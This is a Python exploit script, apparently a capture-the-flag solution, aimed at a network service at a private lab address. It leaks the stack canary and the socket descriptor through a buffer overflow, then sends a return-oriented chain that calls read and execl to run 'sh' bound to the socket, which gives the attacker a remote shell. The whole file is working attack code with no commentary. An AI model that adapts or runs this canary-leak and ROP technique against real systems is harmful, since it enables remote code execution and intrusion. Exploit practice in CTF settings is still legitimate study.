#!/usr/bin/env python
from sc_pwn import *
from time import sleep

rhp     = ("192.168.75.129",8888)

addr_pop_x3         = 0x08048b2c
addr_plt_read       = 0x08048620
addr_plt_execl      = 0x08048710
addr_plt_exit       = 0x08048690
addr_str_sh         = 0x0804970d
addr_buf            = 0x0804b0a0

#==========
def attack(nc):
    canary,fd = leak_data()
    info('canary    = 0x%08x' % canary)
    info('fd        = %d' % fd)
    
    nc.read_until('>')
    nc.sendln('4')
    nc.read_until('(y/n) ')

    sh  = '-c\x00'
    sh += 'sh <&%d >&%d\x00' % (fd,fd)

    exploit  = 'y'+'a'*0x9
    exploit += pack_32(canary)
    exploit += 'b'*0xc
    
    exploit += pack_32(addr_plt_read)
    exploit += pack_32(addr_pop_x3)
    exploit += pack_32(fd)
    exploit += pack_32(addr_buf)
    exploit += pack_32(len(sh))
    
    exploit += pack_32(addr_plt_execl)
    exploit += pack_32(addr_plt_exit)
    exploit += pack_32(addr_str_sh)
    exploit += pack_32(addr_str_sh)
    exploit += pack_32(addr_buf)
    exploit += pack_32(addr_buf+3)
    exploit += pack_32(NULL)
    nc.send(exploit)

    sleep(0.5)
    nc.send(sh)
    
    nc.read_all()

def leak_data():
    nc = Communicate(rhp)

    sleep(2)
    nc.read_until('>')
    nc.sendln('4')
    nc.read_until('(y/n) ')
    nc.send('y'+'a'*0xa)

    leak = nc.read_until('\n').split('\'')[1][11:]
    canary  = unpack_32('\x00'+leak[:3])
    fd      = ord(leak[-1])
    del nc

    return (canary,fd)

#==========

if __name__=='__main__':
    nc = Communicate(rhp)
    attack(nc)

    sh = Shell(nc)
    sh.select()

    del(sh)
    del(nc)
    
#==========
